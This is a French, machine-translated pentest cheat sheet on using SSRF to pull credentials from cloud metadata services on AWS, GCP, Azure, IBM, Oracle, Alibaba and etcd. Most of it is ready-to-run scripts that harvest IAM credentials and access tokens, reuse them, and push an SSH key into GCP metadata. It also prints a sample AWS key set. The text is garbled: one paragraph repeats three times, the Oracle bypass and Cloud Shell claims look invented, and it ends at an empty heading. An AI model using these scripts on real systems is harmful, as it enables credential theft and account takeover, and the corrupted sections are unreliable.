## AWS

### Abus de SSRF dans l'environnement AWS EC2

**La m√©tadonn√©e** peut √™tre acc√©d√©e depuis n'importe quelle machine EC2 et offre des informations int√©ressantes √† son sujet. Elle est accessible √† l'URL : `http://169.254.169.254` ([informations sur la m√©tadonn√©e ici](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

Il y a **2 versions** de la m√©tadonn√©e. La **premi√®re** permet d'**acc√©der** √† la m√©tadonn√©e via des requ√™tes **GET** (donc toute **SSRF peut l'exploiter**). Pour la **version 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), vous devez demander un **jeton** en envoyant une requ√™te **PUT** avec un **en-t√™te HTTP** et ensuite utiliser ce jeton pour acc√©der √† la m√©tadonn√©e avec un autre en-t√™te HTTP (donc c'est **plus compliqu√© √† exploiter** avec une SSRF).

Dans la **version 2**, le **TTL par d√©faut est de 1**. Cela garantit que les appareils r√©seau mal configur√©s (pare-feux, dispositifs NAT, routeurs, etc.) ne transf√®rent pas le paquet. Cela signifie √©galement que les **conteneurs Docker** utilisant la configuration de r√©seau par d√©faut (mode bridge) **ne pourront pas atteindre** le service de m√©tadonn√©es de l'instance.\
**IMDSv2** bloquera √©galement les demandes de r√©cup√©ration d'un jeton qui incluent l'en-t√™te `X-Forwarded-For`. Cela emp√™che les serveurs proxy inverses mal configur√©s d'y acc√©der.

Vous pouvez trouver des informations sur les [points de terminaison de la m√©tadonn√©e dans la documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). Dans le script suivant, des informations int√©ressantes sont obtenues √† partir de celui-ci :
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
    aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
    aws_req="wget -q -O - -H '$HEADER'"
else 
    echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
  echo "Mac: $mac"
  printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
  printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
  printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
  echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
  printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
  echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
  printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
  echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
  echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
  echo "Role: $role"
  eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
  echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
En tant qu'exemple d'exposition de **credentials IAM disponibles publiquement**, vous pouvez visiter : [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

Vous pouvez √©galement v√©rifier les **credentials de s√©curit√© EC2 publics** sur : [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

Vous pouvez ensuite prendre **ces credentials et les utiliser avec AWS CLI**. Cela vous permettra de faire **tout ce que le r√¥le a les autorisations** de faire.

Pour profiter des nouveaux credentials, vous devrez cr√©er un nouveau profil AWS comme celui-ci :
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
Remarquez le **aws\_session\_token**, il est indispensable pour que le profil fonctionne.

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) peut √™tre utilis√© avec les identifiants d√©couverts pour d√©couvrir vos privil√®ges et essayer de les escalader.

### SSRF dans les informations d'identification AWS ECS (Container Service)

**ECS** est un groupe logique d'instances EC2 sur lesquelles vous pouvez ex√©cuter une application sans avoir √† mettre √† l'√©chelle votre propre infrastructure de gestion de cluster car ECS s'en charge pour vous. Si vous parvenez √† compromettre le service en cours d'ex√©cution dans **ECS**, les **points de terminaison de m√©tadonn√©es changent**.

Si vous acc√©dez √† _**http://169.254.170.2/v2/credentials/\<GUID>**_, vous trouverez les informations d'identification de la machine ECS. Mais d'abord, vous devez **trouver le \<GUID>**. Pour trouver le \<GUID>, vous devez lire la variable **environ** **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** √† l'int√©rieur de la machine.\
Vous pourriez √™tre en mesure de le lire en exploitant une **traversal de chemin** vers `file:///proc/self/environ`\
L'adresse http mentionn√©e devrait vous donner les **AccessKey, SecretKey et token**.
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
Notez que dans **certains cas**, vous pourrez acc√©der √† l'**instance de m√©tadonn√©es EC2** √† partir du conteneur (v√©rifiez les limitations de TTL IMDSv2 mentionn√©es pr√©c√©demment). Dans ces sc√©narios, √† partir du conteneur, vous pourriez acc√©der √† la fois au r√¥le IAM du conteneur et au r√¥le IAM EC2.
{% endhint %}

### SSRF pour AWS Lambda <a href="#6f97" id="6f97"></a>

Dans ce cas, les **informations d'identification sont stock√©es dans des variables d'environnement**. Ainsi, pour y acc√©der, vous devez acc√©der √† quelque chose comme **`file:///proc/self/environ`**.

Le **nom** des **variables d'environnement int√©ressantes** sont :

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

De plus, en plus des informations d'identification IAM, les fonctions Lambda ont √©galement des **donn√©es d'√©v√©nement qui sont transmises √† la fonction lorsqu'elle est d√©marr√©e**. Ces donn√©es sont mises √† disposition de la fonction via l'[interface d'ex√©cution](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) et pourraient contenir des **informations sensibles** (comme √† l'int√©rieur des **stageVariables**). Contrairement aux informations d'identification IAM, ces donn√©es sont accessibles via SSRF standard √† **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

{% hint style="warning" %}
Notez que les **informations d'identification lambda** se trouvent dans les **variables d'environnement**. Ainsi, si la **trace de pile** du code lambda imprime les variables d'environnement, il est possible de les **exfiltrer en provoquant une erreur** dans l'application.
{% endhint %}

### URL SSRF pour AWS Elastic Beanstalk <a href="#6f97" id="6f97"></a>

Nous r√©cup√©rons l'`accountId` et la `region` √† partir de l'API.
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
Nous r√©cup√©rons ensuite l'`AccessKeyId`, le `SecretAccessKey` et le `Token` de l'API.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

Ensuite, nous utilisons les identifiants avec `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## GCP <a href="#6440" id="6440"></a>

Vous pouvez [**trouver ici la documentation sur les points de terminaison de m√©tadonn√©es**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).

### URL SSRF pour Google Cloud <a href="#6440" id="6440"></a>

N√©cessite l'en-t√™te "Metadata-Flavor: Google" ou "X-Google-Metadata-Request: True" et vous pouvez acc√©der au point de terminaison de m√©tadonn√©es avec les URL suivantes:

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

Points de terminaison int√©ressants pour extraire des informations:
```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do 
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do 
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```
Beta ne n√©cessite PAS d'en-t√™te pour le moment (merci √† Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
Pour **utiliser le jeton de compte de service exfiltr√©**, vous pouvez simplement faire:
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### Ajouter une cl√© SSH <a href="#3e24" id="3e24"></a>

Extraire le token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
V√©rifiez la port√©e du jeton
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  { 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```
Maintenant, poussez la cl√© SSH.

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
Il n'y a pas de choses comme les r√¥les AWS ou les comptes de service GCP, donc ne vous attendez pas √† trouver des informations d'identification de bot de m√©tadonn√©es.
{% endhint %}

Documentation disponible sur [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Docs** ici](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

* **Doit** contenir l'en-t√™te `Metadata: true`
* Ne doit **pas** contenir d'en-t√™te `X-Forwarded-For`

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}```
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% endtabs %}

## SSRF dans les environnements cloud

Les environnements cloud sont de plus en plus populaires et sont souvent utilis√©s pour h√©berger des applications web. Les fournisseurs de services cloud tels que AWS, GCP et Azure offrent des services tels que des machines virtuelles, des conteneurs, des fonctions sans serveur et des bases de donn√©es. Ces services sont souvent utilis√©s pour h√©berger des applications web.

Les applications web h√©berg√©es dans des environnements cloud peuvent √™tre vuln√©rables aux attaques SSRF. Les attaques SSRF dans les environnements cloud peuvent √™tre plus dangereuses que les attaques SSRF dans les environnements traditionnels car les machines virtuelles, les conteneurs et les fonctions sans serveur ont souvent des autorisations √©lev√©es pour acc√©der √† d'autres services cloud.

Les attaquants peuvent utiliser SSRF pour acc√©der √† des services cloud sensibles tels que les m√©tadonn√©es de la machine virtuelle, les cl√©s d'API et les fichiers de configuration. Les attaquants peuvent √©galement utiliser SSRF pour acc√©der √† des services cloud appartenant √† d'autres clients du m√™me fournisseur de services cloud.

Les attaquants peuvent utiliser SSRF pour acc√©der √† des services cloud sensibles tels que les m√©tadonn√©es de la machine virtuelle, les cl√©s d'API et les fichiers de configuration. Les attaquants peuvent √©galement utiliser SSRF pour acc√©der √† des services cloud appartenant √† d'autres clients du m√™me fournisseur de services cloud.

Les attaquants peuvent utiliser SSRF pour acc√©der √† des services cloud sensibles tels que les m√©tadonn√©es de la machine virtuelle, les cl√©s d'API et les fichiers de configuration. Les attaquants peuvent √©galement utiliser SSRF pour acc√©der √† des services cloud appartenant √† d'autres clients du m√™me fournisseur de services cloud.
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{% endtab %}
{% endtabs %}

### Azure App Service

√Ä partir de **env**, vous pouvez obtenir les valeurs de `IDENTITY_HEADER` _et_ `IDENTITY_ENDPOINT`. Vous pouvez les utiliser pour r√©cup√©rer un jeton pour communiquer avec le serveur de m√©tadonn√©es.

La plupart du temps, vous voulez un jeton pour l'une de ces ressources :

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
  'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
 + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
 + FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
Notez que par d√©faut, les m√©tadonn√©es ne sont pas activ√©es dans IBM, il est donc possible que vous ne puissiez pas y acc√©der m√™me si vous √™tes √† l'int√©rieur d'une machine virtuelle IBM Cloud.
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
  -H "Metadata-Flavor: ibm"\
  -H "Accept: application/json"\
  -d '{
        "expires_in": 3600
      }' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

Documentation disponible sur [`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

(en-t√™te requis ? inconnu)
```
http://169.254.169.254/openstack
```
## HP Helion <a href="#a8e0" id="a8e0"></a>

(header requis ? inconnu)
```
http://169.254.169.254/2009-04-04/meta-data/
```
## Oracle Cloud <a href="#a723" id="a723"></a>

### SSRF

Les instances Oracle Cloud ont une API REST qui peut √™tre utilis√©e pour effectuer des actions sur les instances. Cette API est accessible via l'URL `http://169.254.169.254/opc/v1/`. En utilisant une SSRF, un attaquant peut envoyer des requ√™tes √† cette API pour r√©cup√©rer des informations sensibles telles que les cl√©s d'API, les informations d'identification et les m√©tadonn√©es de l'instance. 

Voici un exemple de requ√™te SSRF pour r√©cup√©rer les informations d'identification de l'instance :

```
http://169.254.169.254/opc/v1/instance/identity
```

### Bypassing Instance Metadata Service

Oracle Cloud a mis en place des mesures de s√©curit√© pour emp√™cher les attaques SSRF. Cependant, il est possible de contourner ces mesures en utilisant des techniques telles que l'injection de caract√®res null (`%00`) ou l'utilisation de l'URL `http://127.0.0.1/`. 

Voici un exemple de requ√™te SSRF contournant les mesures de s√©curit√© en utilisant l'injection de caract√®res null :

```
http://169.254.169.254/opc/v1/%00/instance/identity
```

### Cloud Shell

Oracle Cloud propose une fonctionnalit√© appel√©e Cloud Shell qui permet aux utilisateurs d'ex√©cuter des commandes dans un environnement de shell Linux directement depuis le navigateur. Cette fonctionnalit√© est accessible via l'URL `https://shell.cloud.oracle.com/`. 

En utilisant une SSRF, un attaquant peut envoyer des requ√™tes √† l'API REST de Cloud Shell pour ex√©cuter des commandes arbitraires sur l'instance. 

Voici un exemple de requ√™te SSRF pour ex√©cuter la commande `ls` sur l'instance :

```
https://shell.cloud.oracle.com/api/v1/sessions/1234567890/ssh?command=ls
```
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```
## Alibaba <a href="#51bd" id="51bd"></a>

Alibaba Cloud est un fournisseur de services cloud chinois qui propose une large gamme de services, notamment des serveurs, des bases de donn√©es, des services de s√©curit√© et des solutions d'analyse de donn√©es. Les services cloud d'Alibaba sont utilis√©s par de nombreuses entreprises en Chine et dans le monde entier.

Les vuln√©rabilit√©s SSRF sont courantes sur les serveurs Alibaba Cloud. Les attaquants peuvent utiliser ces vuln√©rabilit√©s pour acc√©der √† des ressources internes, telles que des bases de donn√©es, des fichiers et des cl√©s d'API. Les attaquants peuvent √©galement utiliser des vuln√©rabilit√©s SSRF pour effectuer des attaques de rebond, dans lesquelles ils utilisent un serveur vuln√©rable pour attaquer d'autres serveurs.

Les attaquants peuvent √©galement utiliser des vuln√©rabilit√©s SSRF pour acc√©der √† des informations sensibles, telles que des informations d'identification et des cl√©s d'API. Les attaquants peuvent utiliser ces informations pour acc√©der √† des ressources sensibles, telles que des bases de donn√©es et des fichiers.

Il est important de surveiller les vuln√©rabilit√©s SSRF sur les serveurs Alibaba Cloud et de les corriger d√®s que possible. Les entreprises doivent √©galement mettre en place des mesures de s√©curit√© pour prot√©ger leurs ressources sensibles, telles que des bases de donn√©es et des fichiers.
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

Peut contenir des cl√©s API et des adresses IP et des ports internes.
```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```
## Docker <a href="#ac0b" id="ac0b"></a>

